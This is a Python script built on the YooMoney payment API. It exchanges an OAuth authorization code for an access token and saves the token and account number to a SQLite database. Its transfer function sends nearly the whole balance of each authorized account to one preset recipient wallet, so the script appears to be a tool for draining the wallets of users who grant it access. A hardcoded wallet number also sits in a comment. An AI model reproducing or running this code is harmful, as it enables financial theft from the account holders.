import json.decoder
import sqlite3

import requests
import Config
import SQLite

conn = sqlite3.connect('yoomoney.db')
cursor = conn.cursor()
conn.commit()


def authorize(redirect_uri, client_id):
    request = requests.Session()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    param = {
        'client_id': client_id,
        'response_type': Config.response_type,
        'redirect_uri': redirect_uri,
        'scope': Config.scope
    }
    try:
        response = request.post('https://yoomoney.ru/oauth/authorize', headers=headers, data=param)
        print(response.url)
        return response.url
    except requests.HTTPError:
        return
    except json.decoder.JSONDecodeError:
        return


def get_token(redirect_uri, client_id, code):
    request = requests.Session()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    param = {
        'code': code,
        'client_id': client_id,
        'response_type': Config.response_type,
        'redirect_uri': redirect_uri,
        'grant_type': Config.grant_type
    }
    try:
        response = request.post('https://yoomoney.ru/oauth/token', headers=headers, data=param)
        SQLite.db_table_val(response.json()['access_token'], account(response.json()['access_token']))
        return True
    except requests.HTTPError:
        return False
    except json.decoder.JSONDecodeError:
        return False
    except:
        return False


def balance(token: str):
    request = requests.Session()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Bearer {token}'
    }
    try:
        response = request.post('https://yoomoney.ru/api/account-info', headers=headers)
        return response.json()['balance']
    except requests.HTTPError:
        return -1
    except json.decoder.JSONDecodeError:
        return -1
    except KeyError:
        return -1
    except:
        return -1


def account(token: str):
    request = requests.Session()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Bearer {token}'
    }
    try:
        response = request.post('https://yoomoney.ru/api/account-info', headers=headers)
        return response.json()['account']
    except:
        print('error')
        return


def transfer(token):
    request = requests.Session()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': token
    }
    params = {
        'pattern_id': 'p2p',
        # 'to': '410015400790202',
        'to': Config.to,
        'amount': balance(token) - 1,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = request.post('https://yoomoney.ru/api/request-payment', headers=headers, data=params)
    except requests.HTTPError as error:
        print(error)
        return False
    except json.decoder.JSONDecodeError as error:
        print(error)
        return False
    except KeyError as error:
        print('Not found', error)
        return False
    if response.json()['error']:
        return False, response.json()['error']
    params = {
        'request_id': response.json()['request_id'],
        'money_source': 'wallet'
    }
    try:
        response = request.post('https://yoomoney.ru/api/process-payment', headers=headers, data=params)
        print(response.text)
        return True, response.json()['balance']
    except KeyError:
        pass
    except:
        pass

